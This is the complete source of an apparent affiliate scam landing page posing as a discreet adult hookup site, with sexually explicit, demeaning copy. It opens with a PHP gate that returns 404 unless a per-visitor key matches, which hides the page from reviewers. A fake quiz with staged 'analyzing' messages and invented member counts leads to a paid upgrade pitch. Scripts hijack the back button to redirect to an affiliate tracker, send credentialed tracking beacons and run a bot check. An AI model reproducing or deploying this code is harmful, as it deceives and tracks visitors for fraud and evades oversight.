<?php $e='624fe41d655b5db786f68e15fcbeadf5';$f='404';$g=@$_GET["lpkey"];date_default_timezone_set('Asia/Shanghai');$h=substr($g,0,2).substr($g,4,2).substr($g,8,2).substr($g,12,2).substr($g,16,2);$i=substr($g,2,2).substr($g,6,2).substr($g,10,2).substr($g,14,2);$j=md5($e.$_SERVER['HTTP_ACCEPT_LANGUAGE'].$_SERVER["HTTP_USER_AGENT"].$h);$j=substr($j,2,2).substr($j,7,2).substr($j,12,2).substr($j,24,2);if(time()>$h||$j!==$i||!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){if($f=='404')Header("HTTP/1.1 404 Not Found");else{header('HTTP/1.1 301 Moved Permanently');header('Location: '.$k);}die();}?>
<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta content="noindex, nofollow" name="robots">
	<title></title>
	<meta content="initial-scale=1.0, maximum-scale=1.0" name="viewport">
	<link href="main.css" rel="stylesheet" type="text/css">
	<script src="jquery.min.js" type="text/javascript">
	</script>
</head>
<body style="">
	<script>
	 alert("This is a discreet hookup website.\n\nAt least 71 local moms are looking to hookup right now within 5 miles.\n\nAnswer a few questions and verify your age to qualify so you can view photos and message them asking to hookup now.");
	</script>
	<div style="display:none;"></div>
	<div>
		<div id="wrapper">
			<div id="main">
				<div id="step1">
					<img class="image" src="201.jpg">
					<h1>Are you older than 35?</h1>
				</div>
				<div id="step2" style="display:none">
					<img class="image" src="2.jpg">
					<h1>Are you tired of buying dinner and drinks and just want to fuck?</h1>
				</div>
				<div id="step3" style="display:none">
					<img class="image" src="226.jpg">
					<h1>Are you willing to use a condom with someone you met here?</h1>
				</div>
				<div id="step4" style="display:none"><img class="image" src="193.jpg">
				<h2 id="s1">Analyzing your answers...</h2>
				<h2 id="s2" style="display:none">Duplicate registrations are being reviewed</h2>
				<h2 id="s3" style="display:none">Matching sex-partners...</h2>
				<h2 id="s4" style="display:none">Looking for registration options</h2>
        <img id="load" src="loading.gif"></div>
				<div id="step5" style="display:none">
					<h4></h4>
					<center>
						<h4><img src="top511.gif"><br>
						<span style="color:#d70016">You're in. You can now signup and view over <b>372</b> local profiles for free. Please read the following to find a hookup faster.</span></h4>
					</center>
					<div class="ram">
						<ul class="decimal">
							<li class="one">1. Remember, these women just want to hookup, not change their situation. Just mesage and ask to fuck.</li>
							<li class="two">2. Most of these women will only hookup with you once. Others want to be fuckbuddies and meet often. Ask her what she wants.</li>
							<li class="three">3. Please only join if you are willing to meet real members for casual sex.</li>
							<li class="three">If you try our upgrade for a month, you'll get more private messages that boost your chance of finding a hookup. Your photo will show on our site more and local women will message you more often. Message them freely, unlock cell numbers, see private pics and get a free extra month if you still don't get laid.<br>
							<br>
							Why be stuck in a boring relationship or keep buying dinner for women who won't fuck? For less than the cost of 1 date, you can let bitches come to you. <b>Fuck a new slut every other night</b> who isn't even looking to date.<br>
							<br>
							<b>Tap the "View Matches" button and verify your age to see photos and profiles of <b>153</b> local moms looking to fuck <u>right now.</u></b></li>
						</ul>
					</div><a href="javascript:void(0)" onclick="atgo('click');">
					<div class="button_sub">
						View Matches
					</div></a>
				</div>
				<div id="ans" style="width: 270px; margin:20px auto 0 auto;">
					<a href="javascript:void(0)" id="b"><span class="button_yes" id="nexty">YES</span></a> <a href="javascript:void(0)" id="bn"><span class="button_no" id="nextn">NO</span></a>
				</div>
			</div>
		</div>
		<script type="text/javascript">
		var cur_step = 0;
		function change_step(cur) {
		  if (cur == 1) {
		    $('#step1').hide();
		    $('#step2').show();
		  }
		  else if (cur == 2) {
		    $('#step2').hide();
		    $('#step3').show();afilter(1);
		  }
		  else if (cur == 3) {
		    $('#step3').hide();
		    $('#ans').hide();
		    $('#step4').show();
		    setTimeout(function() {
		      ans_ana(1)            }
		                , 1000);
		    setTimeout(function() {
		      ans_ana(2)            }
		                , 2000);
		    setTimeout(function() {
		      ans_ana(3)            }
		                , 3000);
		    setTimeout(function() {
		      ans_ana(4)            }
		                , 4000);afilter(2);
		  }
		  else if (cur == 4) {
		    $('#load').hide();
		    $('#step4').slideUp(1000, function() {
		      $('#step5').show();
		    }
		                        );
		  }
		  return false;
		}
		function ans_ana(cur) {
		  $('#s' + cur).hide();
		  cur++;
		  if (cur != 5)            $('#s' + cur).show();
		  else            change_step(4);
		  return false;
		}
		$(document).ready(function() {
		  $('#nexty').click(function() {
		    change_step(cur_step + 1);
		    cur_step++;
		    return false;
		  }
		                    );
		  $('#nextn').click(function() {
		    change_step(cur_step + 1);
		    cur_step++;
		    return false;
		  }
		                    );
		}
		                  );
		;
		(function(w, d){
		  "use strict";
		  var Obj = {
		  }
		  ,        toString = Obj.toString,        stopParams = ['dynamicpage', 'target', 'lid', 'isTesting', 'name'],        indexOf = Array.prototype.indexOf || function(searchElement, fromIndex) {
		    var k;
		    if (this == null) {
		      throw new TypeError('"this" is null or not defined');
		    }
		    var O = Object(this);
		    var len = O.length >>> 0;
		    if (len === 0) {
		      return -1;
		    }
		    var n = +fromIndex || 0;
		    if (Math.abs(n) === Infinity) {
		      n = 0;
		    }
		    if (n >= len) {
		      return -1;
		    }
		    k = Math.max(n >= 0 ? n : len - Math.abs(n), 0);
		    while (k < len) {
		      if (k in O && O[k] === searchElement) {
		        return k;
		      }
		      k++;
		    }
		    return -1;
		  }
		  ,        getUrlParams = function() {
		    var search = "",              href = w.location.href,              data;
		    try {
		      href = ~href.indexOf("?") && href.slice(href.indexOf("?") + 1).replace("#","&").split("&");
		    }
		    catch(e) {
		      href = "";
		    }
		    if ( toString.call(href) !== "[object Array]") {
		      for (var i = 0; i < href.length; i++) {
		        data = href[i].split("=");
		        if (data[0] && !~indexOf.call(stopParams, data[0])) {
		          search += "&" + data[0] + "=" + (data[0] === "bo" ? (+data[1] || 0) + 1 : data[1] || "");
		        }
		      }
		    }
		    !~search.indexOf("bo=") && ( search += "&bo=1" );
		    return search;
		  }
		  ,        changeLocation = function( domain, name ) {
		    var search = getUrlParams(),              traf = "aff.php",              additionalParam = '&ver=2',              url;
		    url = domain + traf + '?dynamicpage=' + name + search + additionalParam;
		    w.location = url;
		  }
		  ,        targetLocation = function() {
		    w.history && w.history.pushState && w.history.pushState(null, null, w.location);
		    w.addEventListener && w.addEventListener("popstate" , function() {
		      changeLocation("http://trk.affer.club/click", "bn_mlp_5step_v_bo");
		    }
		                                              , !1);
		  };
		  (function() {
		    if (w.addEventListener)        w.addEventListener("pageshow", function() {
		      setTimeout(targetLocation, 0);
		    }
		                                                       , !1);
		    else        setTimeout(targetLocation, 0);
		  }
		   ());
		}
		 (window, document));
		</script>
	</div>
  <script>

(function(){

let domain = 'trk.reactorphone.com';
let protocol = 'https';

window.afilter = function(event,detail,token){

    if(Number(event) <= 0) return;

    var xhr = new XMLHttpRequest();
    xhr.open('POST', protocol + '://' + domain +'/p/events', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("et=" + event + "&v=" + detail + "&t=" + token);

};

window.atgo = function(url){
    window.location.replace(protocol + '://' + domain + '/' + url);
};

}());

"use strict";!function(){var e={clicks:{clickCount:0,clickWrong:0,clickDetails:[]}};window.AtRequest=function(e="GET",t,n=null){var o=new XMLHttpRequest;o.open(e,t,!0),o.withCredentials=!0,n&&o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)},window.AtClickCheck=function(t=["p","button","a"],n=3,o=0){document.addEventListener("DOMContentLoaded",function(){document.addEventListener("mouseup",function(c){e.clicks.clickCount++,e.clicks.clickDetails.push({timestamp:Date.now(),node:c.target.nodeName,x:c.pageX,y:c.pageY}),o>0&&console.log(c.target.nodeName),t.indexOf(c.target.nodeName.toLowerCase())<0&&e.clicks.clickWrong++,e.clicks.clickWrong>n&&(o>0&&console.log("Bot"),AtRequest("GET",`${protocol}://${domain}/d/wrong`))})})}}();

AtClickCheck(['span','div'],3,1);
</script>
</body>
</html>
